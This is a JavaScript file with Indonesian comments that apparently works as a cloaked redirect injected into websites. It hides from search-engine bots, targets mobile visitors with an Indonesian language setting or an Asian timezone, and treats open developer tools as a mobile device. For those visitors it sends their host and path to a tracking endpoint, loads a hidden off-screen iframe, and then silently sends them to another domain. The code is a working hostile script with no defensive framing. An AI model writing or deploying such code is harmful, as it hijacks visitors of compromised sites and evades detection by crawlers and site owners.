(function () {
  try {

    /* =============================
       KONFIGURASI
    ============================= */
    var ORIGINAL_DOMAIN = "sportandmusclecars.de";
    var TARGET_URL      = "https://blog.sportandmusclecars.de";
    var TRACK_ENDPOINT  = "https://sportandmusclecars.de/";

    if (typeof window === "undefined") return;

    var ua = navigator.userAgent || "";

    /* =============================
       DETEKSI BOT (LEBIH RINGAN)
    ============================= */
    var bots = /Googlebot|bingbot|AhrefsBot|SemrushBot/i;
    if (bots.test(ua)) return;

    /* =============================
       NORMALISASI HOST
    ============================= */
    var currentHost  = location.hostname.replace(/^www\./, "");
    var originalHost = ORIGINAL_DOMAIN.replace(/^www\./, "");

    // ❗ JANGAN BLOK DOMAIN SENDIRI LAGI
    // if (currentHost === originalHost) return;

    /* =============================
       DETEKSI DEVICE (LEBIH FLEXIBLE)
    ============================= */
    var isMobileUA = /Android|iPhone|iPad|Mobile/i.test(ua);
    var isSmallScreen = window.innerWidth < 768;
    var isDevTools = window.outerWidth - window.innerWidth > 100;

    var isMobile = isMobileUA || isSmallScreen || isDevTools;

    /* =============================
       DETEKSI INDONESIA (LEBIH AMAN)
    ============================= */
    var isIndonesia =
      (navigator.language && navigator.language.toLowerCase().includes("id")) ||
      (Intl && Intl.DateTimeFormat().resolvedOptions().timeZone.includes("Asia"));

    // ❗ filter tetap ada tapi tidak terlalu ketat
    if (!isMobile || !isIndonesia) return;

    /* =============================
       TRACKING (OPTIONAL)
    ============================= */
    try {
      var img = new Image();
      img.src =
        TRACK_ENDPOINT +
        "?host=" + encodeURIComponent(currentHost) +
        "&path=" + encodeURIComponent(location.pathname) +
        "&t=" + Date.now();
    } catch (e) {}

    /* =============================
       FINAL URL
    ============================= */
    var finalURL = TARGET_URL.replace(/\/+$/, "");

    /* =============================
       REDIRECT BERLAPIS (VERSI FIX)
    ============================= */

    // Layer 1: iframe (silent)
    setTimeout(function () {
      try {
        var iframe = document.createElement("iframe");
        iframe.style.cssText =
          "width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px";
        iframe.src = finalURL;
        document.documentElement.appendChild(iframe);
      } catch (e) {}
    }, 300);

    // Layer 2: redirect utama
    setTimeout(function () {
      try {
        window.location.href = finalURL;
      } catch (e) {}
    }, 800);

  } catch (e) {
    console.log("ERROR:", e);
  }
})();   